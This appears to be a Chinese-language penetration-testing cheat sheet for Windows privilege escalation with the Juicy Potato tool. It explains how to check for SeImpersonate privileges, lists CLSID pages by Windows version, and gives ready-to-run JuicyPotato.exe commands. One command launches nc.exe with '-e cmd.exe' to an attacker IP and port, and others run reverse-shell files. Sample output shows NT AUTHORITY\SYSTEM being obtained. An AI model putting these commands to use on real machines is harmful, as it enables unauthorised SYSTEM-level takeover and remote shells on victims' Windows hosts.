	Juicy Potato
	如果机器>= Windows 10 1809 & Windows Server 2019 - 尝试Rogue Potato
	如果机器< Windows 10 1809 < Windows Server 2019 - 尝试Juicy Potato
	https://github.com/ohpe/juicy-potato/releases
	检查服务帐户的权限，寻找SeImpersonate/或SeAssignPrimaryToken
	whoami /priv
	根据您的 Windows 版本选择 CLSID，CLSID 是标识 COM 类对象的全局唯一标识符
	https://ohpe.it/juicy-potato/CLSID/Windows_7_Enterprise
	https://ohpe.it/juicy-potato/CLSID/Windows_8.1_Enterprise
	https://ohpe.it/juicy-potato/CLSID/Windows_10_Enterprise
	https://ohpe.it/juicy-potato/CLSID/Windows_10_Pro
	https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise
	https://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter
	https://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard
	执行 JuicyPotato 以运行特权命令
	>JuicyPotato.exe -l 9999 -p c:\interpub\wwwroot\upload\nc.exe -a "IP PORT -e cmd.exe" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}
	>JuicyPotato.exe -l 1340 -p C:\users\User\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
	>JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a "/c c:\users\User\reverse_shell.exe"
	    Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 1337
	    ......
	    [+] authresult 0
	    {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM
	    [+] CreateProcessWithTokenW OK